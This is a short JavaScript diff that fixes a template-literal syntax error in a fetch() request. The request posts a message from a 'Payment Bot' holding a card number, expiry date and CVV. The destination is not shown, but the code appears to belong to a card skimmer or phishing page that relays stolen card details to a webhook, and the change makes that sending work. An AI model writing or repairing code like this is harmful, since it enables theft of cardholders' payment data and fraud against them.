@@ -95,7 +95,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     username: "Payment Bot",
-                    content: Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}
+                    content: `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`
                 })
             })
             .then(response => response.json())
